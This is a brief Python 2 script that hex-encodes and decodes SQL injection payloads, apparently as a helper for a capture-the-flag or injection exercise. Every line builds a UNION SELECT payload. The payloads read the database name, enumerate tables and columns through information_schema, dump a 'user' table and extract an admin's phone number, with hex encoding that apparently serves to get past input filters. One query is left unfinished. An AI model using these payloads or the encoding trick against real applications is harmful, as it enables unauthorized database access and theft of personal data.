import binascii
# def HexToByte( hexStr ):
#     return bytes.fromhex(hexStr)
# >>> binascii.b2a_hex(u"str".encode("utf8"))
# 'e4bda0e5a5bde5958a'
print binascii.b2a_hex(u"select ".encode("utf-8"))
print binascii.a2b_hex("3120756e696f6e2073656c65637420736368656d615f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e736368656d617461").decode("utf8")
print binascii.b2a_hex(u"1 union select group_concat(table_name) from information_schema.tables where table_schema=database()".encode("utf-8"))
print binascii.b2a_hex(u"1 union select database()").encode("utf-8")
print binascii.b2a_hex(u"1 union select table_name from information_schema.tables where table_schema=database()").encode("utf-8")
print binascii.b2a_hex(u"1 union select * from user").encode("utf-8")
print binascii.b2a_hex(u"1 union select column_name from information_schema.columns where table_name = \"user\"").encode("utf-8")
print binascii.b2a_hex(u"1 union select admin from ")
print binascii.b2a_hex(u"1 union select phone from user where username = \"admin\"").encode("utf-8")
print binascii.b2a_hex(u"database()".encode("utf-8"))
print binascii.b2a_hex(u"1 union select database()".encode("utf-8"))